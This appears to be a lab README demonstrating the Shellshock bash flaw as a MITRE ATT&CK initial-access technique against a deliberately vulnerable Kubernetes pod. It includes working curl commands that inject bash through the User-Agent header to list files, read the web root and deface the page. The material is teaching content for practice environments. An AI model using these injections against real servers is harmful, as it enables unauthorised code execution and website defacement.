# Initial Access Demonstration

This demonstration will showcase initial access as part of the MITRE ATT&CK framework. This will showcase Exploition of a Public-Facing Application. This is a slightly modifed version of the vulnerables demo for shellshock.

## What is shellshock?

Improper input validation bash code allowed users to put trailing commands after the definition of environment variables. 

You read this and first think - what uses environment variables.....crap. TONS OF THINGS! SSH, Apache modules, etc.

This meant remote code execution on apaches mod_cgi(d) library used in web servers.

CGI stands for Common Gateway Interface. It is a way to let Apache execute script files and send the
output to the client. So we just need something that will use bash.

# Demo Script

*Note: It's important that this is not exposed to the public internet and highly reccomended to never be run in privlegded mode. (You will actually be hacked if running in privledged mode and publically expose this)* It's reccomended that when using this you only port forward.

## Setup

1. Run shellshock vulerable pod

```
  kubectl run shellshock --labels=app=shellshock,team=evilcasper --image=vulnerables/cve-2014-6271 -n default
```

2. Port forward to the pod.


```
  kubectl port-forward shellshock 8080:80 -n default
```


### Weaponization and delivery

Making it easy for them to find me - the user agent is removed - which is totally normal network traffic :P

Have to make it hard for the copy pasta script kiddies. Also you're never gonna get a website with vulerable as an endpoint.

```
  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /'" \
http://localhost:8080/cgi-bin/vulnerable
```

4. Check out the index file for apache

```
  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /var/www/index.html'" \
http://localhost:8080/cgi-bin/vulnerable
```

### Exploitation

6. Time to mess with people by defacing their website with cat pictures

```
  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>Cat memes are the most important thing in the world.</h1><body><img src=https://i.redd.it/v5cingisv6p01.jpg></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
```
